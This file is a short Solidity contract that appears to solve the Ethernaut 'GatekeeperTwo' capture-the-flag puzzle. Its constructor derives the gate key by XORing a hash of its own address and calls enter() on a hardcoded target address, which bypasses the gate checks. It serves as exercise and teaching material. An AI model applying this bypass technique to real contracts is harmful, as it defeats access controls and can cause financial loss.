// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './GatekeeperTwo.sol';

contract GatekeeperTwoAttack {

    constructor() public {
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0x2D55d7Fd2cd2d3344F2Fd694f05E3fd63A9FDCDA);
        bytes8 gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gatekeeperTwo.enter(gateKey);

    }
}